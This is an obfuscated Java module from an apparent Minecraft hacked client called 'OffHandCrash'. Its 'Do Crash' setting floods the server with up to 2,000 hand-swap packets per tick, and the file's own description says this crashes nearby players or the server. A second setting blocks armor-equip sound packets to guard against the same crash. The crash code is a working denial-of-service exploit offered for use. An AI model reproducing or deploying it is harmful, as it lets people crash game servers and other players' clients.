package wwe.modules.exploits;

import wwe.modules.*;
import wwe.utils.*;
import net.minecraft.network.play.client.*;
import net.minecraft.util.*;
import net.minecraft.network.*;
import net.minecraft.init.*;
import net.minecraft.network.play.server.*;
import wwe.*;

public class OffHandCrash extends qMIe
{
    public BooleanValue doCrash;
    public BooleanValue antiCrash;
    public NumberValue speed;
    
    public OffHandCrash() {
        super("Off Hand Crash", "Prevent and or do the off hand crash exploit", 0, Category.EXPLOITS);
    }
    
    @Override
    public void HrDr() {
        this.doCrash = new BooleanValue("Do Crash", this, "Switchs item from your off hand really fast, some times crashing players in render distance or crashing the server", false);
        this.antiCrash = new BooleanValue("Anti Crash", this, "Doesnt allow them to crash your game/lower your fps", true);
        this.speed = new NumberValue("Speed", this, "How many times it will switch hands, a tick", 500.0, 1.0, 2000.0);
    }
    
    @oqrr
    public void Wgpx(final omqH omqH) {
        if (this.doCrash.OnGi()) {
            int n = 0;
            while (n < this.speed.OnGi()) {
                Wrapper.mc.player.connection.sendPacket((Packet)new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, Wrapper.mc.player.getPosition(), EnumFacing.UP));
                ++n;
                if (OffHandCrash.\u2006\u2006\u2008) {
                    throw null;
                }
            }
        }
    }
    
    @oqrr
    public void DwMG(final LqJY lqJY) {
        if (this.antiCrash.OnGi()) {
            if (lqJY.MYlK() instanceof SPacketSoundEffect && ((SPacketSoundEffect)lqJY.MYlK()).getSound() == SoundEvents.ITEM_ARMOR_EQUIP_GENERIC) {
                lqJY.Ggez(true);
            }
            if (lqJY.MYlK() instanceof SPacketCustomSound && ((SPacketCustomSound)lqJY.MYlK()).getSoundName().equals("item.armor.equip_generic")) {
                lqJY.Ggez(true);
            }
        }
    }
    
    @Override
    public void LPxx() {
        hSNE.lyvR(this);
    }
    
    @Override
    public void qBmy() {
        hSNE.kduK(this);
    }
}
